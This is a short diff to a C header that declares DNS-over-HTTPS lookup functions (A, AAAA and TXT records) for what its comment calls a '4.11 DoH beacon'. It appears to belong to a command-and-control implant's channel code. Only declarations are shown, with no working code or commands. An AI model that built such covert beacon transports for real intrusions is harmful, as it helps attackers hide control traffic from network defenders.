@@ -10,6 +10,13 @@ void http_post_maybe(char * url);
 int http_get(char * url, void * cookie, char* buffer, int max);
 
 BOOL channel_lookup(char * domain, unsigned int * result);
+
+/* DNS-over-HTTPS transport (4.11 DoH beacon): same record semantics as the
+ * DnsQuery consumers, carrier swapped for application/dns-message POSTs */
+BOOL doh_enabled(void);
+unsigned int doh_lookup_a(char * domain);
+int doh_lookup_aaaa(char * domain, char * out16);
+int doh_lookup_txt(char * domain, char * buffer, int max);
 unsigned int channel_lookup_retry(char * domain, int retry);
 
 u_long channel_localip();
